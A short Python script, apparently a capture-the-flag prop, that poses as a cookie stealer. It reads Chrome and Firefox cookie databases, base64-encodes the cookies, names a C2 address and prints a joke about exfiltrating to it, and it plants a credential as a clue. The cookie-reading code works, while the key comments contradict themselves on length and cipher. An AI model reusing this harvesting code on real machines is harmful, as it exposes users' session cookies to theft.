import os
import sqlite3
import base64
from Crypto.Cipher import AES  # Fake dependency

# Hardcoded "encryption" key (AES-256)
KEY = b"MonsterMunch123456"  # 16-byte key (weak for a reason)
C2_SERVER = "185.143.223.11"  # Fake C2 (players should ignore this)

def steal_cookies():
    # Fake paths to browser cookies
    browsers = {
        "Chrome": os.path.expanduser("~/.config/chrome/Cookies"),
        "Firefox": os.path.expanduser("~/.mozilla/firefox/cookies.sqlite")
    }

    stolen_data = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM cookies")  # Oversimplified
            cookies = cursor.fetchall()
            stolen_data.append(f"{browser}: {cookies}")

    # "Encrypt" the data (just Base64 for CTF)
    encrypted = base64.b64encode(str(stolen_data).encode()).decode()
    return encrypted

if __name__ == "__main__":
    print("[+] Stealing cookies...")
    data = steal_cookies()
    print(f"[+] Encrypted data: {data}")
    print(f"[+] Exfiltrating to {C2_SERVER} (just kidding!)")
    print("[!] Fun fact: First test victim was admin:BlueberryPancakes")
